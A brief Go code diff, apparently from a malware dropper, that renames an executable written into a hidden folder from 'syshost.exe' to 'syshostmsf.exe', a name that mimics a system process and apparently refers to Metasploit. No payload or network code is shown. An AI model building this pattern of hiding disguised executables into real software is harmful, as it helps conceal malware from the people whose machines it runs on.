@@ -27,7 +27,7 @@ func main() {
 		fmt.Println("Error creating hidden folder:", err)
 		return
 	}
-	outputFile := filepath.Join(hiddenFolder, "syshost.exe")
+	outputFile := filepath.Join(hiddenFolder, "syshostmsf.exe")
 	file, err := os.Create(outputFile)
 	if err != nil {
 		fmt.Println("Error creating file:", err)
